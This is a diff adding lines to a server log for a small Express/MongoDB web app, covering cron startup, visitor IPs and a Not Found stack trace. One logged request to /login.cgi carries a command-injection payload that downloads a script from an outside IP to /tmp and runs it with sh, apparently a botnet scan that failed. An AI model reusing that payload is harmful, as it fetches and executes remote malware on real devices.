@@ -5,3 +5,42 @@
 [37m06/20/2018-06:06:24.53 [39m[33mDeezNuts[39m: 76.91.217.22: /GET /
 [37m06/20/2018-06:06:24.61 [39m[33mDeezNuts[39m: Viewer found: 76.91.217.22
 [37m06/20/2018-06:06:40.18 [39m[33mDeezNuts[39m: params: {"response":"_kVAqVjjzUoIsDQpB7hAjLk6x5zVIb-7mDsuhAddJ2Q"}
+[37m06/20/2018-06:30:27.10 [39m[33mDeezNuts[39m: Starting Crons
+[37m06/20/2018-06:30:27.12 [39m[33mDeezNuts[39m: started cron - Ping
+[37m06/20/2018-06:30:27.12 [39m[33mDeezNuts[39m: started cron - Midnight
+[34m[37m06/20/2018-06:30:27.55 [34m[33mDeezNuts[34m: Mongoose connection open[39m
+[37m06/20/2018-06:30:41.06 [39m[33mDeezNuts[39m: 76.91.217.22: /GET /
+[37m06/20/2018-06:30:41.15 [39m[33mDeezNuts[39m: Viewer found: 76.91.217.22
+[37m06/20/2018-06:30:48.56 [39m[33mDeezNuts[39m: params: [object Object]
+[37m06/20/2018-06:30:48.56 [39m[33mDeezNuts[39m: params: {"response":"DQNwsi5YcrS9Srfa1uznz91khSFMeHubBkuz0MrVnsk"}
+[37m06/20/2018-06:30:48.57 [39m[33mDeezNuts[39m: resp: DQNwsi5YcrS9Srfa1uznz91khSFMeHubBkuz0MrVnsk
+[37m06/20/2018-06:37:09.76 [39m[33mDeezNuts[39m: 199.193.119.77: /GET /
+[37m06/20/2018-06:37:09.86 [39m[33mDeezNuts[39m: Viewer created: 199.193.119.77
+[37m06/20/2018-06:37:12.92 [39m[33mDeezNuts[39m: 199.193.119.77, 66.249.88.145: /GET /
+[37m06/20/2018-06:37:13.01 [39m[33mDeezNuts[39m: Viewer created: 199.193.119.77, 66.249.88.145
+[37m06/20/2018-06:37:14.39 [39m[33mDeezNuts[39m: 199.193.119.77, 66.249.88.145: /POST /sync
+[37m06/20/2018-06:37:14.48 [39m[33mDeezNuts[39m: Viewer found: 199.193.119.77, 66.249.88.145
+[37m06/20/2018-06:44:31.21 [39m[33mDeezNuts[39m: 181.49.174.130: /GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$
+[1m[33m[37m06/20/2018-06:44:31.30 [33m { NotFoundError: Not Found[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/app.js:87:8[39m[22m
+[1m[33m    at Layer.handle [as handle_request] (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/layer.js:95:5)[39m[22m
+[1m[33m    at trim_prefix (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:317:13)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:284:7[39m[22m
+[1m[33m    at Function.process_params (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:335:12)[39m[22m
+[1m[33m    at next (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:275:10)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:635:15[39m[22m
+[1m[33m    at next (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:260:14)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/routes/index.js:16:2[39m[22m
+[1m[33m    at Layer.handle [as handle_request] (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/layer.js:95:5)[39m[22m
+[1m[33m    at trim_prefix (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:317:13)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:284:7[39m[22m
+[1m[33m    at Function.process_params (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:335:12)[39m[22m
+[1m[33m    at next (/opt/bitnami/apps/alexdeeznuts/node_modules/express/lib/router/index.js:275:10)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/modules/mixins.js:99:9[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/connect-mongodb-session/index.js:176:21[39m[22m
+[1m[33m    at result (/opt/bitnami/apps/alexdeeznuts/node_modules/mongodb/lib/utils.js:414:17)[39m[22m
+[1m[33m    at executeCallback (/opt/bitnami/apps/alexdeeznuts/node_modules/mongodb/lib/utils.js:406:9)[39m[22m
+[1m[33m    at handleCallback (/opt/bitnami/apps/alexdeeznuts/node_modules/mongodb/lib/utils.js:128:55)[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/mongodb/lib/collection.js:1031:5[39m[22m
+[1m[33m    at /opt/bitnami/apps/alexdeeznuts/node_modules/mongodb-core/lib/connection/pool.js:544:18[39m[22m
+[1m[33m    at process._tickCallback (internal/process/next_tick.js:61:11) message: 'Not Found' }[39m[22m
